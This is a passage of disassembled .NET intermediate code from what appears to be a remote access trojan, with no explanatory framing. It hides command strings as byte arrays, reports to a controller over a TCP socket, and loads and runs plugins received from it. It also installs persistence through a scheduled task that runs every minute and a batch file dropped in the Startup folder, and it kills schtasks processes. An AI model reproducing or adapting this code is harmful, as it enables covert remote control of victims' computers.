        IL_1495:  stelem.i1
        IL_1496:  ldloc.s    V_109
        IL_1498:  ldc.i4.1
        IL_1499:  ldc.i4.s   46
        IL_149b:  stelem.i1
        IL_149c:  ldloc.s    V_109
        IL_149e:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_14a3:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                                string)
        IL_14a8:  pop
        IL_14a9:  ldc.i4.2
        IL_14aa:  newarr     [mscorlib]System.Byte
        IL_14af:  stloc.s    V_109
        IL_14b1:  ldloc.s    V_109
        IL_14b3:  ldc.i4.0
        IL_14b4:  ldc.i4.s   117
        IL_14b6:  stelem.i1
        IL_14b7:  ldloc.s    V_109
        IL_14b9:  ldc.i4.1
        IL_14ba:  ldc.i4.s   100
        IL_14bc:  stelem.i1
        IL_14bd:  ldloc.s    V_109
        IL_14bf:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_14c4:  call       bool Q.BasicFunctions::SendIt(string)
        IL_14c9:  pop
        IL_14ca:  leave      IL_1565

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_14cf:  dup
        IL_14d0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_14d5:  stloc.s    V_96
        IL_14d7:  ldc.i4.s   12
        IL_14d9:  newarr     [mscorlib]System.Byte
        IL_14de:  stloc.s    V_128
        IL_14e0:  ldloc.s    V_128
        IL_14e2:  ldc.i4.0
        IL_14e3:  ldc.i4.s   85
        IL_14e5:  stelem.i1
        IL_14e6:  ldloc.s    V_128
        IL_14e8:  ldc.i4.1
        IL_14e9:  ldc.i4.s   112
        IL_14eb:  stelem.i1
        IL_14ec:  ldloc.s    V_128
        IL_14ee:  ldc.i4.2
        IL_14ef:  ldc.i4.s   100
        IL_14f1:  stelem.i1
        IL_14f2:  ldloc.s    V_128
        IL_14f4:  ldc.i4.3
        IL_14f5:  ldc.i4.s   97
        IL_14f7:  stelem.i1
        IL_14f8:  ldloc.s    V_128
        IL_14fa:  ldc.i4.4
        IL_14fb:  ldc.i4.s   116
        IL_14fd:  stelem.i1
        IL_14fe:  ldloc.s    V_128
        IL_1500:  ldc.i4.5
        IL_1501:  ldc.i4.s   101
        IL_1503:  stelem.i1
        IL_1504:  ldloc.s    V_128
        IL_1506:  ldc.i4.6
        IL_1507:  ldc.i4.s   32
        IL_1509:  stelem.i1
        IL_150a:  ldloc.s    V_128
        IL_150c:  ldc.i4.7
        IL_150d:  ldc.i4.s   69
        IL_150f:  stelem.i1
        IL_1510:  ldloc.s    V_128
        IL_1512:  ldc.i4.8
        IL_1513:  ldc.i4.s   82
        IL_1515:  stelem.i1
        IL_1516:  ldloc.s    V_128
        IL_1518:  ldc.i4.s   9
        IL_151a:  ldc.i4.s   82
        IL_151c:  stelem.i1
        IL_151d:  ldloc.s    V_128
        IL_151f:  ldc.i4.s   10
        IL_1521:  ldc.i4.s   79
        IL_1523:  stelem.i1
        IL_1524:  ldloc.s    V_128
        IL_1526:  ldc.i4.s   11
        IL_1528:  ldc.i4.s   82
        IL_152a:  stelem.i1
        IL_152b:  ldloc.s    V_128
        IL_152d:  stloc.s    V_97
        IL_152f:  ldloc.s    V_11
        IL_1531:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_1536:  ldsfld     string Q.SettingPad::Y
        IL_153b:  ldloc.s    V_97
        IL_153d:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_1542:  ldloc.s    V_96
        IL_1544:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_1549:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_154e:  call       bool Q.BasicFunctions::SendIt(string)
        IL_1553:  pop
        IL_1554:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1559:  leave      IL_187f

        IL_155e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1563:  leave.s    IL_1565

      }  // end handler
      IL_1565:  leave      IL_187f

      IL_156a:  ldloc.s    V_28
      IL_156c:  ldc.i4.2
      IL_156d:  newarr     [mscorlib]System.Byte
      IL_1572:  stloc.s    V_109
      IL_1574:  ldloc.s    V_109
      IL_1576:  ldc.i4.0
      IL_1577:  ldc.i4.s   69
      IL_1579:  stelem.i1
      IL_157a:  ldloc.s    V_109
      IL_157c:  ldc.i4.1
      IL_157d:  ldc.i4.s   120
      IL_157f:  stelem.i1
      IL_1580:  ldloc.s    V_109
      IL_1582:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_1587:  ldc.i4.0
      IL_1588:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_158d:  ldc.i4.0
      IL_158e:  bne.un     IL_1643

      IL_1593:  ldsfld     object Q.SettingPad::SlaveM
      IL_1598:  brtrue.s   IL_15e8

      IL_159a:  ldc.i4.3
      IL_159b:  newarr     [mscorlib]System.Byte
      IL_15a0:  stloc.s    V_125
      IL_15a2:  ldloc.s    V_125
      IL_15a4:  ldc.i4.0
      IL_15a5:  ldc.i4.s   80
      IL_15a7:  stelem.i1
      IL_15a8:  ldloc.s    V_125
      IL_15aa:  ldc.i4.1
      IL_15ab:  ldc.i4.s   76
      IL_15ad:  stelem.i1
      IL_15ae:  ldloc.s    V_125
      IL_15b0:  ldc.i4.2
      IL_15b1:  ldc.i4.s   71
      IL_15b3:  stelem.i1
      IL_15b4:  ldloc.s    V_125
      IL_15b6:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_15bb:  call       bool Q.BasicFunctions::SendIt(string)
      IL_15c0:  pop
      IL_15c1:  ldc.i4.0
      IL_15c2:  stloc.s    V_98
      IL_15c4:  br.s       IL_15d4

      IL_15c6:  ldloc.s    V_98
      IL_15c8:  ldc.i4.1
      IL_15c9:  add.ovf
      IL_15ca:  stloc.s    V_98
      IL_15cc:  ldc.i4.s   100
      IL_15ce:  call       object Q.BasicFunctions::Thr(int32)
      IL_15d3:  pop
      IL_15d4:  ldsfld     object Q.SettingPad::SlaveM
      IL_15d9:  ldnull
      IL_15da:  ceq
      IL_15dc:  ldc.i4.0
      IL_15dd:  ceq
      IL_15df:  ldloc.s    V_98
      IL_15e1:  ldc.i4.s   20
      IL_15e3:  ceq
      IL_15e5:  or
      IL_15e6:  brfalse.s  IL_15c6

      IL_15e8:  ldsfld     object Q.SettingPad::SlaveM
      IL_15ed:  ldnull
      IL_15ee:  ldstr      "Operations"
      IL_15f3:  ldc.i4.1
      IL_15f4:  newarr     [mscorlib]System.Object
      IL_15f9:  stloc.s    V_112
      IL_15fb:  ldloc.s    V_112
      IL_15fd:  ldc.i4.0
      IL_15fe:  ldarg.0
      IL_15ff:  stelem.ref
      IL_1600:  ldloc.s    V_112
      IL_1602:  stloc.s    V_126
      IL_1604:  ldloc.s    V_126
      IL_1606:  ldnull
      IL_1607:  ldnull
      IL_1608:  ldc.i4.1
      IL_1609:  newarr     [mscorlib]System.Boolean
      IL_160e:  stloc.s    V_127
      IL_1610:  ldloc.s    V_127
      IL_1612:  ldc.i4.0
      IL_1613:  ldc.i4.1
      IL_1614:  stelem.i1
      IL_1615:  ldloc.s    V_127
      IL_1617:  ldc.i4.1
      IL_1618:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_161d:  pop
      IL_161e:  ldloc.s    V_127
      IL_1620:  ldc.i4.0
      IL_1621:  ldelem.i1
      IL_1622:  brfalse.s  IL_1643

      IL_1624:  ldloc.s    V_126
      IL_1626:  ldc.i4.0
      IL_1627:  ldelem.ref
      IL_1628:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_162d:  ldtoken    uint8[]
      IL_1632:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_1637:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_163c:  castclass  uint8[]
      IL_1641:  starg.s    b
      IL_1643:  ldloc.s    V_28
      IL_1645:  ldc.i4.3
      IL_1646:  newarr     [mscorlib]System.Byte
      IL_164b:  stloc.s    V_125
      IL_164d:  ldloc.s    V_125
      IL_164f:  ldc.i4.0
      IL_1650:  ldc.i4.s   80
      IL_1652:  stelem.i1
      IL_1653:  ldloc.s    V_125
      IL_1655:  ldc.i4.1
      IL_1656:  ldc.i4.s   76
      IL_1658:  stelem.i1
      IL_1659:  ldloc.s    V_125
      IL_165b:  ldc.i4.2
      IL_165c:  ldc.i4.s   71
      IL_165e:  stelem.i1
      IL_165f:  ldloc.s    V_125
      IL_1661:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_1666:  ldc.i4.0
      IL_1667:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_166c:  ldc.i4.0
      IL_166d:  bne.un     IL_179f

      .try
      {
        IL_1672:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_1677:  stloc.s    V_103
        IL_1679:  ldloc.1
        IL_167a:  ldc.i4.0
        IL_167b:  ldelem.ref
        IL_167c:  ldsfld     string Q.SettingPad::Y
        IL_1681:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_1686:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_168b:  stloc.s    V_99
        IL_168d:  ldloc.s    V_103
        IL_168f:  ldarg.0
        IL_1690:  ldloc.s    V_99
        IL_1692:  ldarg.0
        IL_1693:  ldlen
        IL_1694:  conv.ovf.i4
        IL_1695:  ldloc.s    V_99
        IL_1697:  sub.ovf
        IL_1698:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_169d:  ldloc.s    V_103
        IL_169f:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_16a4:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_16a9:  stloc.s    V_101
        IL_16ab:  ldloc.s    V_101
        IL_16ad:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_16b2:  stloc.s    V_100
        IL_16b4:  ldloc.s    V_100
        IL_16b6:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_16bb:  stloc.s    V_102
        IL_16bd:  ldloc.s    V_102
        IL_16bf:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_16c4:  ldsfld     string [mscorlib]System.String::Empty
        IL_16c9:  ldc.i4.1
        IL_16ca:  call       object Q.BasicFunctions::XR(uint8[],
                                                         string,
                                                         bool)
        IL_16cf:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_16d4:  stsfld     object Q.SettingPad::SlaveM
        IL_16d9:  ldsfld     object Q.SettingPad::SlaveM
        IL_16de:  ldnull
        IL_16df:  ldstr      "Y"
        IL_16e4:  ldc.i4.1
        IL_16e5:  newarr     [mscorlib]System.Object
        IL_16ea:  stloc.s    V_126
        IL_16ec:  ldloc.s    V_126
        IL_16ee:  ldc.i4.0
        IL_16ef:  ldsfld     string Q.SettingPad::Y
        IL_16f4:  stelem.ref
        IL_16f5:  ldloc.s    V_126
        IL_16f7:  ldnull
        IL_16f8:  ldnull
        IL_16f9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[])
        IL_16fe:  ldsfld     object Q.SettingPad::SlaveM
        IL_1703:  ldnull
        IL_1704:  ldstr      "H"
        IL_1709:  ldc.i4.1
        IL_170a:  newarr     [mscorlib]System.Object
        IL_170f:  stloc.s    V_126
        IL_1711:  ldloc.s    V_126
        IL_1713:  ldc.i4.0
        IL_1714:  call       object Q.Network::MH()
        IL_1719:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
        IL_171e:  stloc.s    V_111
        IL_1720:  ldloca.s   V_111
        IL_1722:  call       string Q.BasicFunctions::DEB(string&)
        IL_1727:  stelem.ref
        IL_1728:  ldloc.s    V_126
        IL_172a:  ldnull
        IL_172b:  ldnull
        IL_172c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[])
        IL_1731:  ldsfld     object Q.SettingPad::SlaveM
        IL_1736:  ldnull
        IL_1737:  ldstr      "P"
        IL_173c:  ldc.i4.1
        IL_173d:  newarr     [mscorlib]System.Object
        IL_1742:  stloc.s    V_126
        IL_1744:  ldloc.s    V_126
        IL_1746:  ldc.i4.0
        IL_1747:  call       string Q.Network::NPn()
        IL_174c:  stloc.s    V_111
        IL_174e:  ldloca.s   V_111
        IL_1750:  call       string Q.BasicFunctions::DEB(string&)
        IL_1755:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_175a:  box        [mscorlib]System.Int32
        IL_175f:  stelem.ref
        IL_1760:  ldloc.s    V_126
        IL_1762:  ldnull
        IL_1763:  ldnull
        IL_1764:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[])
        IL_1769:  ldsfld     object Q.SettingPad::SlaveM
        IL_176e:  ldnull
        IL_176f:  ldstr      "C"
        IL_1774:  ldc.i4.1
        IL_1775:  newarr     [mscorlib]System.Object
        IL_177a:  stloc.s    V_126
        IL_177c:  ldloc.s    V_126
        IL_177e:  ldc.i4.0
        IL_177f:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
        IL_1784:  stelem.ref
        IL_1785:  ldloc.s    V_126
        IL_1787:  ldnull
        IL_1788:  ldnull
        IL_1789:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[])
        IL_178e:  leave.s    IL_179f

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1790:  dup
        IL_1791:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1796:  stloc.s    V_104
        IL_1798:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_179d:  leave.s    IL_179f

      }  // end handler
      IL_179f:  leave      IL_187f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_17a4:  dup
      IL_17a5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_17aa:  stloc.s    V_105
      IL_17ac:  ldloc.1
      IL_17ad:  ldlen
      IL_17ae:  conv.ovf.i4
      IL_17af:  ldc.i4.0
      IL_17b0:  ble.s      IL_180f

      IL_17b2:  ldloc.1
      IL_17b3:  ldc.i4.0
      IL_17b4:  ldelem.ref
      IL_17b5:  ldc.i4.2
      IL_17b6:  newarr     [mscorlib]System.Byte
      IL_17bb:  stloc.s    V_125
      IL_17bd:  ldloc.s    V_125
      IL_17bf:  ldc.i4.0
      IL_17c0:  ldc.i4.s   69
      IL_17c2:  stelem.i1
      IL_17c3:  ldloc.s    V_125
      IL_17c5:  ldc.i4.1
      IL_17c6:  ldc.i4.s   120
      IL_17c8:  stelem.i1
      IL_17c9:  ldloc.s    V_125
      IL_17cb:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_17d0:  ldc.i4.0
      IL_17d1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_17d6:  ldc.i4.0
      IL_17d7:  ceq
      IL_17d9:  ldloc.1
      IL_17da:  ldc.i4.0
      IL_17db:  ldelem.ref
      IL_17dc:  ldc.i4.3
      IL_17dd:  newarr     [mscorlib]System.Byte
      IL_17e2:  stloc.s    V_109
      IL_17e4:  ldloc.s    V_109
      IL_17e6:  ldc.i4.0
      IL_17e7:  ldc.i4.s   80
      IL_17e9:  stelem.i1
      IL_17ea:  ldloc.s    V_109
      IL_17ec:  ldc.i4.1
      IL_17ed:  ldc.i4.s   76
      IL_17ef:  stelem.i1
      IL_17f0:  ldloc.s    V_109
      IL_17f2:  ldc.i4.2
      IL_17f3:  ldc.i4.s   71
      IL_17f5:  stelem.i1
      IL_17f6:  ldloc.s    V_109
      IL_17f8:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_17fd:  ldc.i4.0
      IL_17fe:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1803:  ldc.i4.0
      IL_1804:  ceq
      IL_1806:  or
      IL_1807:  brfalse.s  IL_180f

      IL_1809:  ldnull
      IL_180a:  stsfld     object Q.SettingPad::SlaveM
      .try
      {
        IL_180f:  ldc.i4.5
        IL_1810:  newarr     [mscorlib]System.String
        IL_1815:  stloc.s    V_110
        IL_1817:  ldloc.s    V_110
        IL_1819:  ldc.i4.0
        IL_181a:  ldc.i4.2
        IL_181b:  newarr     [mscorlib]System.Byte
        IL_1820:  stloc.s    V_125
        IL_1822:  ldloc.s    V_125
        IL_1824:  ldc.i4.0
        IL_1825:  ldc.i4.s   69
        IL_1827:  stelem.i1
        IL_1828:  ldloc.s    V_125
        IL_182a:  ldc.i4.1
        IL_182b:  ldc.i4.s   82
        IL_182d:  stelem.i1
        IL_182e:  ldloc.s    V_125
        IL_1830:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_1835:  stelem.ref
        IL_1836:  ldloc.s    V_110
        IL_1838:  ldc.i4.1
        IL_1839:  ldsfld     string Q.SettingPad::Y
        IL_183e:  stelem.ref
        IL_183f:  ldloc.s    V_110
        IL_1841:  ldc.i4.2
        IL_1842:  ldloc.1
        IL_1843:  ldc.i4.0
        IL_1844:  ldelem.ref
        IL_1845:  stelem.ref
        IL_1846:  ldloc.s    V_110
        IL_1848:  ldc.i4.3
        IL_1849:  ldsfld     string Q.SettingPad::Y
        IL_184e:  stelem.ref
        IL_184f:  ldloc.s    V_110
        IL_1851:  ldc.i4.4
        IL_1852:  ldloc.s    V_105
        IL_1854:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_1859:  stelem.ref
        IL_185a:  ldloc.s    V_110
        IL_185c:  call       string [mscorlib]System.String::Concat(string[])
        IL_1861:  call       bool Q.BasicFunctions::SendIt(string)
        IL_1866:  pop
        IL_1867:  leave.s    IL_1878

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1869:  dup
        IL_186a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_186f:  stloc.s    V_106
        IL_1871:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1876:  leave.s    IL_1878

      }  // end handler
      IL_1878:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_187d:  leave.s    IL_187f

    }  // end handler
    IL_187f:  ret
  } // end of method DataRequist::ProcessingData

} // end of class Q.DataRequist

.class public auto ansi sealed Q.Evering
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .method public static void  Thr() cil managed
  {
    // Code size       49 (0x31)
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  ldsfld     class [mscorlib]System.IO.FileInfo Q.SettingPad::LO
      IL_0005:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_000a:  ldc.i4.7
      IL_000b:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0010:  ldsfld     string Q.SettingPad::RG
      IL_0015:  ldstr      ""
      IL_001a:  call       object Q.Evering::M(string,
                                               string,
                                               string,
                                               string)
      IL_001f:  pop
      IL_0020:  leave.s    IL_0030

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0022:  dup
      IL_0023:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0028:  stloc.0
      IL_0029:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002e:  leave.s    IL_0030

    }  // end handler
    IL_0030:  ret
  } // end of method Evering::Thr

  .method public static void  S() cil managed
  {
    // Code size       78 (0x4e)
    .maxstack  4
    .locals init (int32 V_0,
             class [mscorlib]System.Exception V_1)
    IL_0000:  ldc.i4.0
    IL_0001:  stloc.0
    IL_0002:  br.s       IL_004a

    IL_0004:  ldc.i4     0x3e8
    IL_0009:  call       object Q.BasicFunctions::Thr(int32)
    IL_000e:  pop
    .try
    {
      IL_000f:  ldloc.0
      IL_0010:  ldc.i4.1
      IL_0011:  add.ovf
      IL_0012:  stloc.0
      IL_0013:  ldloc.0
      IL_0014:  ldc.i4.s   16
      IL_0016:  ble.s      IL_003a

      IL_0018:  ldc.i4.0
      IL_0019:  stloc.0
      IL_001a:  ldsfld     class [mscorlib]System.IO.FileInfo Q.SettingPad::LO
      IL_001f:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0024:  ldc.i4.7
      IL_0025:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_002a:  ldsfld     string Q.SettingPad::RG
      IL_002f:  ldstr      ""
      IL_0034:  call       object Q.Evering::M(string,
                                               string,
                                               string,
                                               string)
      IL_0039:  pop
      IL_003a:  leave.s    IL_004a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003c:  dup
      IL_003d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0042:  stloc.1
      IL_0043:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0048:  leave.s    IL_004a

    }  // end handler
    IL_004a:  ldc.i4.1
    IL_004b:  brtrue.s   IL_0004

    IL_004d:  ret
  } // end of method Evering::S

  .method public static void  F() cil managed
  {
    // Code size       182 (0xb6)
    .maxstack  4
    .locals init (int32 V_0,
             string V_1,
             class [System]System.Diagnostics.Process V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             int32 V_5,
             class [System]System.Diagnostics.Process[] V_6)
    IL_0000:  ldc.i4.0
    IL_0001:  stloc.0
    IL_0002:  br         IL_00af

    IL_0007:  ldc.i4     0x3e8
    IL_000c:  call       object Q.BasicFunctions::Thr(int32)
    IL_0011:  pop
    .try
    {
      IL_0012:  ldloc.0
      IL_0013:  ldc.i4.1
      IL_0014:  add.ovf
      IL_0015:  stloc.0
      IL_0016:  ldloc.0
      IL_0017:  ldc.i4.s   16
      IL_0019:  ble        IL_009e

      IL_001e:  ldc.i4.0
      IL_001f:  stloc.0
      .try
      {
        IL_0020:  ldstr      "schtasks /create /sc minute /mo 1 /tn "
        IL_0025:  ldsfld     string Q.SettingPad::SeN
        IL_002a:  ldstr      " /tr "
        IL_002f:  ldsfld     class [mscorlib]System.IO.FileInfo Q.SettingPad::LO
        IL_0034:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0039:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_003e:  stloc.1
        IL_003f:  ldloc.1
        IL_0040:  ldc.i4.0
        IL_0041:  ldc.i4.0
        IL_0042:  ldc.i4.m1
        IL_0043:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                   valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                   bool,
                                                                                                   int32)
        IL_0048:  pop
        IL_0049:  ldc.i4     0x3e8
        IL_004e:  call       object Q.BasicFunctions::Thr(int32)
        IL_0053:  pop
        IL_0054:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcesses()
        IL_0059:  stloc.s    V_6
        IL_005b:  ldc.i4.0
        IL_005c:  stloc.s    V_5
        IL_005e:  br.s       IL_0086

        IL_0060:  ldloc.s    V_6
        IL_0062:  ldloc.s    V_5
        IL_0064:  ldelem.ref
        IL_0065:  stloc.2
        IL_0066:  ldloc.2
        IL_0067:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
        IL_006c:  ldstr      "schtasks"
        IL_0071:  ldc.i4.0
        IL_0072:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                          string,
                                                                                                                          bool)
        IL_0077:  ldc.i4.0
        IL_0078:  bne.un.s   IL_0080

        IL_007a:  ldloc.2
        IL_007b:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
        IL_0080:  ldloc.s    V_5
        IL_0082:  ldc.i4.1
        IL_0083:  add.ovf
        IL_0084:  stloc.s    V_5
        IL_0086:  ldloc.s    V_5
        IL_0088:  ldloc.s    V_6
        IL_008a:  ldlen
        IL_008b:  conv.ovf.i4
        IL_008c:  blt.s      IL_0060

        IL_008e:  leave.s    IL_009e

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0090:  dup
        IL_0091:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0096:  stloc.3
        IL_0097:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_009c:  leave.s    IL_009e

      }  // end handler
      IL_009e:  leave.s    IL_00af

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00a0:  dup
      IL_00a1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00a6:  stloc.s    V_4
      IL_00a8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ad:  leave.s    IL_00af

    }  // end handler
    IL_00af:  ldc.i4.1
    IL_00b0:  brtrue     IL_0007

    IL_00b5:  ret
  } // end of method Evering::F

  .method public static void  Pu() cil managed
  {
    // Code size       128 (0x80)
    .maxstack  4
    .locals init (int32 V_0,
             class [mscorlib]System.Text.StringBuilder V_1,
             class [mscorlib]System.Exception V_2)
    IL_0000:  ldc.i4.0
    IL_0001:  stloc.0
    IL_0002:  br.s       IL_007c

    IL_0004:  ldc.i4     0x3e8
    IL_0009:  call       object Q.BasicFunctions::Thr(int32)
    IL_000e:  pop
    .try
    {
      IL_000f:  ldloc.0
      IL_0010:  ldc.i4.1
      IL_0011:  add.ovf
      IL_0012:  stloc.0
      IL_0013:  ldloc.0
      IL_0014:  ldc.i4.s   16
      IL_0016:  ble.s      IL_006c

      IL_0018:  ldc.i4.0
      IL_0019:  stloc.0
      IL_001a:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_001f:  stloc.1
      IL_0020:  ldloc.1
      IL_0021:  ldstr      "@echo off"
      IL_0026:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::AppendLine(string)
      IL_002b:  pop
      IL_002c:  ldloc.1
      IL_002d:  ldstr      "start "
      IL_0032:  ldsfld     class [mscorlib]System.IO.FileInfo Q.SettingPad::LO
      IL_0037:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_003c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0041:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::AppendLine(string)
      IL_0046:  pop
      IL_0047:  ldc.i4.7
      IL_0048:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_004d:  ldstr      "\\"
      IL_0052:  ldsfld     string Q.SettingPad::RG
      IL_0057:  ldstr      ".bat"
      IL_005c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0061:  ldloc.1
      IL_0062:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
      IL_0067:  call       void [mscorlib]System.IO.File::WriteAllText(string,
                                                                       string)
      IL_006c:  leave.s    IL_007c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_006e:  dup
